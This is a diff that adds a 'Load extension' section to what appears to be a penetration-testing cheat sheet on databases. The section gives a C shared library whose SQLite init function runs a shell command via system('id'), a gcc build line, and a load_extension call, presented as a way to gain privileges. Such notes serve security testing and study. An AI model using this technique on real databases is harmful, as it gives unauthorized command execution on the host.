@@ -60,6 +60,24 @@ or open in vs code
 .tables
 ```
 
+### Load extension
+> Sometimes you have to load extension to get some privileges
+> Note: the function name need to be `sqlite3_<extension_name>_init`
+
+```c
+// gcc -s -g -fPIC -shared my_extension.c -o my_extension.so
+#include <stdlib.h>
+int sqlite3_my_extension_init(){
+    system("id");
+    return 0;
+}
+```
+
+After that you can load the extension on sqlite with:
+```sql
+load_extension("my_extension.so");
+```
+
 # Postgres
 > Port: 5432
 
